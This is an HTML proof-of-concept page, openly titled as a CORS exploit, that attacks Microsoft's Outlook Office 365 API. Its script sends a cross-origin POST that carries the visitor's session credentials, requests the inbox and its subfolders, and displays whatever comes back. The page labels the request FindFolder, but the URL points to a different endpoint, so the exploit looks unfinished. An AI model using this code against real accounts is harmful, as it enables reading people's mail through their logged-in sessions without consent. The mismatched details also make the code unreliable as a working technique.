<!DOCTYPE html>
<html>
<head>
  <title>FindFolder CORS Exploit</title>
</head>
<body>
  <h1>Exploit: POST to FindFolder</h1>
  <button onclick="exploit()">Send Exploit Request</button>

  <pre id="output">Waiting...</pre>

  <script>
    function exploit() {
      fetch("https://outlook.office365.com/api/beta/me/translateExchangeIds?n=88", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          // Adjust based on what FindFolder expects
          FolderId: "inbox",
          IncludeSubfolders: true
        })
      })
      .then(response => {
        if (!response.ok) {
          throw new Error("Request failed: " + response.status);
        }
        return response.text();
      })
      .then(data => {
        document.getElementById("output").textContent = "Response:\n" + data;
      })
      .catch(error => {
        document.getElementById("output").textContent = "Error:\n" + error;
      });
    }
  </script>
</body>
</html>
